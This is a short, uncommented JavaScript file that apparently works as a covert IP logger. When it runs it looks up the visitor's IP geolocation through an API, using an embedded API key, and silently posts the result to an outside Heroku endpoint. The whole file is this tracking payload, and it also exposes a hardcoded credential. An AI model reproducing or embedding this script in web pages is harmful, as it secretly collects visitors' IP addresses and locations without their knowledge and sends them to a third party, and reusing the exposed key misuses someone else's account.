function send(data) {
	fetch("https://ytip.herokuapp.com/post", {
        headers: {
            'Content-Type': 'application/json',
        },
		method: "POST",
        mode: "cors",
		body: data
	}).then(d => {
        return null;
    })
}

function httpGetAsync(url, callback) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() {
        if (xmlHttp.readyState === 4 && xmlHttp.status === 200)
        send(xmlHttp.responseText);
    }
    xmlHttp.open("GET", url, true); // true for asynchronous
    xmlHttp.send(null);
}

var url = "https://ipgeolocation.abstractapi.com/v1/?api_key=2a62603c70db41108bf5affbad337263"

httpGetAsync(url, null)
